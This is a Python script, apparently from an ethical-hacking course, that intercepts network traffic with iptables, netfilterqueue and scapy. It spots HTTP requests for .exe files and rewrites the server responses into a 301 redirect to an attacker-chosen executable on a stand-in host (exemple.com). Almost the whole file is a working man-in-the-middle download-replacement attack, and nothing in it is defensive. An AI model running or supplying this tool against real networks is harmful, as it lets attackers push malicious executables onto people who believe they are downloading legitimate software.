#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy


def create_queue(id):
    # for testing in local machine call 2 times, and change de field FORWARD to: OUTPUT, INPUT
    # subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", id])
    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", id])
    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", id])
    print("Packets redirected to the queue with id: " + id)


ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] .exe Request:")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file...")
                modified_packet = set_load(scapy_packet,
                                           "HTTP/1.1 301 Moved Permanently\nLocation: "
                                           "http://www.exemple.com/exemple.exe\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()


try:
    # create the queue at the system
    create_queue("0")
    # create an instance of netfilterqueue object
    queue = netfilterqueue.NetfilterQueue()
    # connect this object with queue created in our system
    # set the process_packet as callback function
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C, restoring IP tables.")
    # to restore the ip tables: iptables -- flush
    subprocess.call(["iptables", "--flush"])
